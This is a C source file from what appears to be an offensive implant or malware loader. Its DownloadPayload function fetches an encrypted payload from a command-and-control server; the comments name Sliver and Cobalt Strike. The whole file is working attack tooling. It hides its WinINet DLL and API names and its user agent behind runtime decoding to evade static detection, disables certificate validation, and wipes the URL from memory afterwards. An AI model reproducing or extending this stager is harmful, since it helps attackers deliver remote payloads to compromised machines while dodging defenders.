// =============================================
// Staging.c - Download encrypted payload via HTTP/HTTPS
// Handles self-signed certificates (Sliver/Cobalt Strike)
// Uses InternetCrackUrlA for robust URL parsing
// =============================================

#include "Common.h"

#define DOWNLOAD_CHUNK_SIZE     8192
#define INTERNET_OPEN_TYPE_PRECONFIG    0
#define INTERNET_SERVICE_HTTP           3
#define INTERNET_DEFAULT_HTTP_PORT      80
#define INTERNET_DEFAULT_HTTPS_PORT     443
#define INTERNET_FLAG_SECURE            0x00800000
#define INTERNET_FLAG_RELOAD            0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE    0x04000000
#define INTERNET_FLAG_KEEP_CONNECTION   0x00400000
#define INTERNET_FLAG_NO_AUTO_REDIRECT  0x00200000
#define INTERNET_FLAG_IGNORE_CERT_CN_INVALID    0x00001000
#define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
#define INTERNET_OPTION_SECURITY_FLAGS  31
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA         0x00000100
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID    0x00001000
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
#define SECURITY_FLAG_IGNORE_REVOCATION         0x00000080
#define HTTP_QUERY_STATUS_CODE          19
#define HTTP_QUERY_FLAG_NUMBER          0x20000000
#define INTERNET_SCHEME_HTTP            3
#define INTERNET_SCHEME_HTTPS           4

// WinINet typedefs
typedef PVOID(WINAPI* fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef PVOID(WINAPI* fnInternetConnectA)(PVOID, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, ULONG_PTR);
typedef PVOID(WINAPI* fnHttpOpenRequestA)(PVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, ULONG_PTR);
typedef BOOL (WINAPI* fnHttpSendRequestA)(PVOID, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI* fnInternetReadFile)(PVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* fnInternetCloseHandle)(PVOID);
typedef BOOL (WINAPI* fnInternetSetOptionA)(PVOID, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI* fnInternetQueryOptionA)(PVOID, DWORD, LPVOID, LPDWORD);
typedef BOOL (WINAPI* fnHttpQueryInfoA)(PVOID, DWORD, LPVOID, LPDWORD, LPDWORD);

// InternetCrackUrlA
typedef struct _URL_COMPONENTSA_S {
    DWORD   dwStructSize;
    LPSTR   lpszScheme;
    DWORD   dwSchemeLength;
    DWORD   nScheme;
    LPSTR   lpszHostName;
    DWORD   dwHostNameLength;
    WORD    nPort;
    LPSTR   lpszUserName;
    DWORD   dwUserNameLength;
    LPSTR   lpszPassword;
    DWORD   dwPasswordLength;
    LPSTR   lpszUrlPath;
    DWORD   dwUrlPathLength;
    LPSTR   lpszExtraInfo;
    DWORD   dwExtraInfoLength;
} URL_COMPONENTSA_S;

typedef BOOL(WINAPI* fnInternetCrackUrlA)(LPCSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, URL_COMPONENTSA_S* lpUrlComponents);

BOOL DownloadPayload(
    IN  PAPI_HASHING pApi,
    IN  LPCSTR       szUrl,
    OUT PBYTE*       ppData,
    OUT PDWORD       pdwSize
) {
    // Deobfuscate DLL name
    BYTE xWininet[] = XSTR_WININET_DLL;
    DEOBF(xWininet);
    HMODULE hWinInet = pApi->pLoadLibraryA((LPCSTR)xWininet);
    if (!hWinInet) {
        LOG("[!] LoadLibrary(wininet) FAILED");
        return FALSE;
    }

    // Deobfuscate API names
    BYTE xA1[] = XSTR_INTERNET_OPEN_A;
    BYTE xA2[] = XSTR_INTERNET_CONNECT_A;
    BYTE xA3[] = XSTR_HTTP_OPEN_REQUEST_A;
    BYTE xA4[] = XSTR_HTTP_SEND_REQUEST_A;
    BYTE xA5[] = XSTR_INTERNET_READ_FILE;
    BYTE xA6[] = XSTR_INTERNET_CLOSE_HANDLE;
    BYTE xA7[] = XSTR_INTERNET_SET_OPTION_A;
    BYTE xA8[] = XSTR_INTERNET_QUERY_OPTION_A;
    BYTE xA9[] = XSTR_INTERNET_CRACK_URL_A;
    DEOBF(xA1); DEOBF(xA2); DEOBF(xA3); DEOBF(xA4);
    DEOBF(xA5); DEOBF(xA6); DEOBF(xA7); DEOBF(xA8);
    DEOBF(xA9);

    fnInternetOpenA      pInetOpen    = (fnInternetOpenA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
    fnInternetConnectA   pInetConnect = (fnInternetConnectA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
    fnHttpOpenRequestA   pHttpOpen    = (fnHttpOpenRequestA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA3);
    fnHttpSendRequestA   pHttpSend    = (fnHttpSendRequestA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA4);
    fnInternetReadFile   pInetRead    = (fnInternetReadFile)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA5);
    fnInternetCloseHandle pInetClose  = (fnInternetCloseHandle)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
    fnInternetSetOptionA pInetSetOpt  = (fnInternetSetOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
    fnInternetQueryOptionA pInetQueryOpt = (fnInternetQueryOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);
    fnInternetCrackUrlA  pCrackUrl    = (fnInternetCrackUrlA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA9);

    if (!pInetOpen || !pInetConnect || !pHttpOpen || !pHttpSend || !pInetRead || !pInetClose || !pCrackUrl) {
        LOG("[!] Failed resolving WinINet");
        return FALSE;
    }

    // Parse URL using InternetCrackUrlA (handles all edge cases)
    CHAR szHost[256] = { 0 };
    CHAR szPath[512] = { 0 };

    URL_COMPONENTSA_S uc;
    MemSet(&uc, 0, sizeof(uc));
    uc.dwStructSize     = sizeof(uc);
    uc.lpszHostName     = szHost;
    uc.dwHostNameLength = sizeof(szHost);
    uc.lpszUrlPath      = szPath;
    uc.dwUrlPathLength  = sizeof(szPath);

    if (!pCrackUrl(szUrl, 0, 0, &uc)) {
        LOG("[!] InternetCrackUrl failed");
        return FALSE;
    }

    WORD wPort  = uc.nPort;
    BOOL bHttps = (uc.nScheme == INTERNET_SCHEME_HTTPS);

    LOG("[*] Connecting...");

    // Open session (deobfuscated User-Agent)
    BYTE xUA[] = XSTR_USER_AGENT;
    DEOBF(xUA);
    PVOID hInternet = pInetOpen(
        (LPCSTR)xUA,
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) {
        LOG("[!] InternetOpen FAILED");
        return FALSE;
    }

    // Connect to host
    PVOID hConnect = pInetConnect(
        hInternet, szHost, wPort,
        NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        LOG("[!] InternetConnect FAILED");
        pInetClose(hInternet);
        return FALSE;
    }

    // Build request flags
    DWORD dwReqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    if (bHttps) {
        dwReqFlags |= INTERNET_FLAG_SECURE
                    |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                    |  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    // Open GET request
    BYTE xGET[] = XSTR_HTTP_GET;
    DEOBF(xGET);
    PVOID hRequest = pHttpOpen(hConnect, (LPCSTR)xGET, szPath, NULL, NULL, NULL, dwReqFlags, 0);
    if (!hRequest) {
        LOG("[!] HttpOpenRequest FAILED");
        pInetClose(hConnect);
        pInetClose(hInternet);
        return FALSE;
    }

    // Send request - first attempt (will fail on self-signed cert)
    LOG("[*] Sending request...");
    BOOL bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);

    // If HTTPS failed (self-signed cert), set flags on SAME handle and retry
    // MSDN pattern: the SSL context is created by the first attempt,
    // so security flags can only be modified after it fails
    if (!bSent && bHttps && pInetSetOpt) {
        // Query existing security flags on this handle (SSL context exists now)
        DWORD dwSecFlags = 0;
        DWORD dwBuffLen  = sizeof(dwSecFlags);
        if (pInetQueryOpt)
            pInetQueryOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, &dwBuffLen);

        // OR in all cert-ignore flags
        dwSecFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    |  SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                    |  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                    |  SECURITY_FLAG_IGNORE_REVOCATION;

        pInetSetOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));

        // Retry on SAME handle - SSL context preserved
        bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
    }

    if (!bSent) {
        LOG("[!] HttpSendRequest FAILED");
        pInetClose(hRequest);
        pInetClose(hConnect);
        pInetClose(hInternet);
        return FALSE;
    }
    LOG("[+] Request sent, reading response...");

    // Verify HTTP 200 OK before reading body
    BYTE xQueryInfo[] = XSTR_HTTP_QUERY_INFO_A;
    DEOBF(xQueryInfo);
    fnHttpQueryInfoA pHttpQuery = (fnHttpQueryInfoA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xQueryInfo);
    if (pHttpQuery) {
        DWORD dwStatusCode = 0;
        DWORD dwStatusLen  = sizeof(dwStatusCode);
        DWORD dwIndex      = 0;
        if (pHttpQuery(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                       &dwStatusCode, &dwStatusLen, &dwIndex)) {
            if (dwStatusCode != 200) {
                LOG("[!] Server returned non-200 status");
                pInetClose(hRequest);
                pInetClose(hConnect);
                pInetClose(hInternet);
                return FALSE;
            }
        }
    }

    // Read response in chunks
    SIZE_T  sTotalSize = 0;
    SIZE_T  sCapacity  = DOWNLOAD_CHUNK_SIZE * 32;
    PBYTE   pBuffer    = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
    if (!pBuffer) {
        pInetClose(hRequest);
        pInetClose(hConnect);
        pInetClose(hInternet);
        return FALSE;
    }

    DWORD dwBytesRead = 0;
    while (1) {
        if (sTotalSize + DOWNLOAD_CHUNK_SIZE > sCapacity) {
            sCapacity *= 2;
            PBYTE pNew = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
            if (!pNew) break;
            MemCopy(pNew, pBuffer, sTotalSize);
            HeapFree(GetProcessHeap(), 0, pBuffer);
            pBuffer = pNew;
        }

        if (!pInetRead(hRequest, pBuffer + sTotalSize, DOWNLOAD_CHUNK_SIZE, &dwBytesRead))
            break;
        if (dwBytesRead == 0)
            break;
        sTotalSize += dwBytesRead;
    }

    pInetClose(hRequest);
    pInetClose(hConnect);
    pInetClose(hInternet);

    // Wipe sensitive URL data from stack
    MemSet(szHost, 0, sizeof(szHost));
    MemSet(szPath, 0, sizeof(szPath));

    if (sTotalSize == 0) {
        LOG("[!] Downloaded 0 bytes");
        HeapFree(GetProcessHeap(), 0, pBuffer);
        return FALSE;
    }

    *ppData = pBuffer;
    *pdwSize = (DWORD)sTotalSize;
    LOG("[+] Payload downloaded");
    return TRUE;
}
